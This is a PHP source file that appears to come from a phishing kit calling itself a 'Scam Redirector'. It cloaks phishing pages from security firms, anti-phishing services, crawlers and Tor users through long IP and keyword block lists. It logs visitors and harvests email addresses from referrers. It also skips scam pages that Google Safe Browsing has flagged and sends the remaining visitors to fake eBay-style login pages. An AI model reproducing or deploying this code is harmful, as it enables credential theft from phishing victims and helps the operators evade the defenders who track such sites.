    '195.254.224-195.254.226', '74.55.44.237', '206.208.58', '149.20',
    '219.117.238.174', '212.102.67', '216.239.32-216.239.63', '64.114.199',
    '131.107', '74.53', '81.218', '91.199.104', '131.114',
    '78.129.140', '207.206.148', '165.166.47.186', '210.230.183', '59.188.106.242',
    '69.20.70.31', '209.235.254.107', '66.118.156-66.118.157', '66.230.220',
    '208.64.136-208.64.143', '209.120.218.128-209.120.218.255',
    '208.115.138-208.115.139', '216.128.11',
    '216.171.98.64-216.171.98.127', '66.16.13.59', '128.130', '212.27.36.1', '74.208',
    '219.127.103.193-219.127.103.254', '66.179.210.128-66.179.210.255', '195.214.79',
    '62.67.194', '66.16.13.55', '194.250.175',
    '82.80.128-82.80.159', '66.118.188.128-66.118.188.255', '62.219',
    '212.227.103.74', '209.131.32-209.131.63', '84.110.48-84.110.63', '72.37.244', 
    '160.83', '65.52-65.55', '195.127.173.128-195.127.173.191', '24.123.240.186',
	'66.230.194', '98.64.68.139', '194.88.228-194.88.229', '64.41.151', '64.156.26',
    '65.17.248-65.17.255', '72.37.171', '60.248.169.142', '67.202',
    '174.129', '208.118.60', '72.44.32-72.44.63', '80.254.144-80.254.159', '141.212.110.65',
    '64.127.98.128', '8.6.118.7', '221.186.93.163', '217.212.224.128-217.212.224.255',
	'74.6', '193.47.80', '66.235.112-66.235.127', '204.187.65', '63.236.244-63.236.245',
	'211.78.130', '208.81.237.128-208.81.237.255', '194.106.220-194.106.221', '194.153.113', '8.21.4.254',
	'213.136.52.0-213.136.52.127', '192.18.0-192.18.194', '192.245.12', '69.36.252', '64.16.237',
	'88.80.205.192-88.80.205.223', '78.90.16.77', '143.215', '216.82.240-216.82.255',
	'208.80.200-208.80.207', '64.12.112', '195.93.18', '205.188.112', '207.200.112',
	'205.178.184-205.178.191', '165.212', '203.198', '81.173.0-81.173.127', '211.104-211.119',
	'219.76-219.79', '203.71-203.72', '61.208.232-61.208.255', '210.87.240-210.87.255', '220.255',
	'218.102-218.103', '141.217', '74.92.105.141', '144.137.8.170', '207.171.160-207.171.191',
	'98.130-98.131', '116.48-116.49', '195.93.64', '70.54.212.160-70.54.212.175', '208.87.136-208.87.139',
	'207.206.202-207.206.203', '12.1.231.96-12.1.231.127', '198.6.32-198.6.63', '66.193.242.5', '216.73.80-216.73.95',
	'216.185.96-216.185.127', '174.132-174.133', '66.223.0-66.223.127', '83.89.217.82', '208.80.192-208.80.199',
	'62.231.131', '72.30', '192.92.94', '38.100.41', '74.201.145',
	'212.117.160-212.117.175', '149.156.2', '220.233.112.41', '216.128.0-216.128.31', '62.241.4-62.241.5',
	'213.198.84.192-213.198.84.223', '217.114.220.0-217.114.220.63', '216.104.0-216.104.31', '86.17.163.200', '206.210.93',
	'216.145.24.13', '213.199.128-213.199.143', '193.108.72-193.108.79', '86.171.213.150', '213.161.88-213.161.89',
	 '70.84-70.87', '204.16.206', '86.171.209.252', '78.129.174',
	 '62.141.32-62.141.43', '124.43', '74.125', '85.158.136-85.158.143', '69.41.160-69.41.191',
	 '62.189.112.128-62.189.112.255', '216.49.80-216.49.95', '38.105.71', '87.237.108', '74.63.64-74.63.127',
'67.159.0-67.159.63', '66.220.111', '193.200.150', '213.186.32-213.186.63', '63.82.71.128-63.82.71.143', '83.221.114',
'64.127.96-64.127.127', '84.97.0.0-84.103.231.255', '195.212.29', '212.97.132-212.97.135', '85.17.56', '212.227.68-212.227.108',
 '50.16', '66.150.14', '109.65', '66.150.9.128-66.150.9.191', '62.99.77.165', '220.130.53.5', '62.249.178.200',
'69.36.190.48');

$owner_array = array('eBay', 'eBay', 'eBay', 'Technology Universe, LLC', 'eBay', 'eBay', 'Skype Technologies OU', 'eBay', 'eBay', 'Microsoft Corp', 'eBay', 'MAN1 Network C', 'Google', 'Yahoo!');

// '127.0.0.1',
//Define banned words found in hostname, UA & referrer
$bw = array('phish', 'clean-mx', 'libwww', 'clamav', 'wget', 'web-sniffer',
    '10.112.10.10', 'jakarta commons', 'siteadvisor.com', 'bezeqint', 'fraudwatch',
    'scampatmaker', 'urllib', 'brantect.com', 'm2k agetnt', 'showthread.php',
	'.blogspot.com', '.mailprotector.net', 'groups.yahoo.com', 'crawler', 'lwp::simple',
	'webwasher', 'w3m/', 'www-mechanize/', 'libcurl', 'google.com/search', 'www.google.com', '.ipt.aol.com', '"', 'lionic.com');

//'.mailprotector.net' should be moved to the new updates in the future

//Define banned words found in UA & referrer
$bua = array('', 'Mozilla/5.0 (compatible; en-us)', 'Mozilla/4.0 (compatible;)', 'Mozilla/4.0 (compatible)', 'Mozilla/4.0', 'Mozilla/6.0', '12345', 'Mozilla/3.01 (compatible;)', 'JetBrains 5.0', 'JetBrains 4.0', '.');

//Suspicious IPs
$susp_array = array('203.27.226', '121.72.138.44', '209.244.4', '78.149.92.246',
'86.57.32-86.57.63', '131.215', '84.101.228.107', '207.157.0-207.157.127', '89.240.114.70',
'89.240', '205.209.128-205.209.191', '149.156', '86.171.153.79', '81.159.187.250');

//Custom IPs
$custom_array = array('98.130-98.131');

/*
Statistics
*/
//$array = file('stats.txt');

$fh = fopen('stats.txt', 'r');
$data = fread($fh, 512);
$array = explode(",", $data);
fclose($fh);

$tim = $array[0];
$vst = $array[1];
$unq = $array[2];
$bnd = $array[3];
$wat = $array[4];
$nor = $array[5];

$vst = $vst + 1;

if (checkUniqueIP($ip) == false)
{
	$fh = fopen('ip.txt', 'a');
	fwrite($fh, $ip."\n");
	fclose($fh);
	$unq = $unq + 1;
}

function WriteStats($tim, $vst, $unq, $bnd, $wat, $nor)
{
	$fh = fopen('stats.txt', 'w');
	fwrite($fh, "$tim,$vst,$unq,$bnd,$wat,$nor");
	fclose($fh);
}

//Returns the scam url with
function ScamURL($scams)
{
    for ($i = 0; $i <= count($scams) - 1; $i++)
    {
        //Download each scam page for checking
		/*
		
		Warning: file_get_contents(the url) [function.file-get-contents]: failed to open stream: HTTP request failed! HTTP/1.1 500 Internal Server Error in file on line 1053
		*/
        $scam_page = file_get_contents($scams[$i] . PATH);

        //Add <ISONLINE VALUE=TRUE></ISONLINE> to your scam page
        $online = get_between($scam_page, "<ISONLINE VALUE=", "></ISONLINE>");
        if ($online == "TRUE")
        {
            //Check if it is blacklisted
            if (GOOG_ANTIPHISH == 1)
            {
				$goog_url = "http://sb.google.com/safebrowsing/lookup?sourceid=firefox-antiphish&features=TrustRank&client=navclient-auto-tbff&q=".$scams[$i].PATH;
                $google_page = file_get_contents($goog_url);
                $blacklisted = strpos($google_page, "phishy:1:1");
                if ($blacklisted === false)
                {
                    $scam_url = $scams[$i] . PATH;
					return $scam_url;
                    break;
                }
            } elseif (GOOG_ANTIPHISH == 0)
            {
                $scam_url = $scams[$i] . PATH;
				return $scam_url;
                break;
            }

        }
    }
}

//Write IP Address to On The Fly banning list
if (checkWord($hostname, $bw) || checkWord($agent, $bw) || checkWord($referrer, $bw))
{
	$file = "ip_ban.txt";

	if (CheckDuplicate($ip, $file) == FALSE)
	{
		$fhandle = fopen($file, "a");
		fwrite($fhandle, $ip."\n");
		fclose($fhandle);
	}
}

if (checkIP($ip, $susp_array))
{
    $fhandle = fopen(LOG_FILE, "a");
    fwrite($fhandle, "<font color=blue>" . $ip . " - " . $hostname . " - " . $dt . " - " . $agent . " - " . MailFromReferrer($referrer) . " - " . counter() .  "</font><br/>");
    fclose($fhandle);
	$wat = $wat+1;
	WriteStats($tim, $vst, $unq, $bnd, $wat, $nor);
}

if (checkIP($ip, $ban_array) || checkMatch($agent, $bua) || checkAsRedirect($referrer) || checkWord($hostname, $bw) || checkWord($agent, $bw) || checkWord($referrer, $bw) || checkTorNode($ip) || checkOnTheFlyBan($ip))
{
    $fhandle = fopen(LOG_FILE, "a");
    fwrite($fhandle, "<font color=red>" . $ip . " - " . $hostname . " - " . $dt . " - " . GetIPOwner($ip, $ban_array, $owner_array) ." - " . $agent . " - " . MailFromReferrer($referrer) . " - " . counter() .
        "</font><br/>");
    fclose($fhandle);
	$bnd = $bnd+1;
	WriteStats($tim, $vst, $unq, $bnd, $wat, $nor);
    header("Location: " . REDIRECT_TO);
} else
{
	GetEmail($referrer, $ip);
    $fhandle = fopen(LOG_FILE, "a");
    fwrite($fhandle, "<font color=green>" . $ip . "</font> - " . $hostname . " - " .
        $dt . " - " . $agent . " - " . MailFromReferrer($referrer) . " - " . counter() .
        "<br/>");
    fclose($fhandle);
	$nor = $nor+1;
    WriteStats($tim, $vst, $unq, $bnd, $wat, $nor);

	$scam_url = ScamURL($scams);
	/*Need to modify this code, once ScamURL($scams) will return the last scam, then send email, one scam left messag and out of scams, send mail with smtp or mail*/
    //Send an email if you only have one scam!
    if ($send_email == 1)
    {
        if ($i == (count($scams) - 1))
        {
			//Send Email
			$fh = fopen('sent.txt', 'r');
			$data = fread($fh, 512);			
			fclose($fh);
			
			if ($data == 0) {
			
			$subject  = "ALERT: Scam Redirector (Out of Scams)";
			$date = date("Y-m-d");
			$message = "Your Scam Redirector is out of scams.<br /><br />URL: <a href=http://".$_SERVER['SERVER_NAME'].INDEX.">http://".$_SERVER['SERVER_NAME'].INDEX."</a><br />Version: ".VERSION."<br />Date: $date";

			$headers  = "MIME-Version: 1.0\r\n";
			$headers .= "Content-type: text/html; charset=iso-8859-1 \r\n";
			$headers .= "From: Scam Redirector <sss@scamredirector.cash>\r\n";
			
			mail(EMAIL, stripslashes($subject), stripslashes($message), stripslashes($headers));
			
            $fh = fopen('sent.txt', 'w');
            fwrite($fh, "1\n");			
            fclose($fh);
			}
        } else
		{
			$fh = fopen('sent.txt', 'w');
            fwrite($fh, "0\n");
            fclose($fh);
		}
    }

    if (!empty($scam_url))
    {
		
        header("Location: " . $scam_url . "?bidderblocklogin&hc=1&hm=uk%601d72f%2Bj2b2vi%3C265bidderblocklogin&hc=1&hm=uk%601d72f%2Bj2b2vi%3C265bidderblocklogin&hc=1&hm=uk%601d72f%2Bj2b2vi%3C265");
    } else
    {
		
        header("Location: " . REDIRECT_TO);
    }

}
?>